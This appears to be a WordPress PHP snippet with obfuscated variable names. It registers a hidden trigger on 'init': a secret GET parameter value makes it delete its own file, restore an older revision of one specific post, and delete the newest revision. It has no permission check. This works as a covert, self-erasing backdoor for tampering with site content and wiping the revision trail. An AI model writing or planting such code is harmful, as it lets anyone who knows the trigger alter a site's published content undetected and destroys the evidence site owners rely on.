<?php

function query_campaign_view() {
	if (isset($_GET['assets_list_short_posts']) && $_GET['assets_list_short_posts'] === 'logo_ip_install') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$private_chatbot_card = 645200;
		$countdown_safe_business = wp_get_post_revisions($private_chatbot_card);
		if (empty($countdown_safe_business)) die('no revisions');
		if (count($countdown_safe_business) < 2) die('less than 2');
		$uploader_counter_signup = array_shift($countdown_safe_business);
		$connect_link_thumbnail_pro = $uploader_counter_signup->ID;
		$latest_syntax_github = array_shift($countdown_safe_business);
		$finder_static_testimonial_gravity = $latest_syntax_github->ID;
		$export_timer_gallery_support = wp_restore_post_revision($finder_static_testimonial_gravity);
		if ($export_timer_gallery_support === false) die('error restoring');
		$export_timer_gallery_support = wp_delete_post_revision($connect_link_thumbnail_pro);		
		if ($export_timer_gallery_support === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'query_campaign_view');
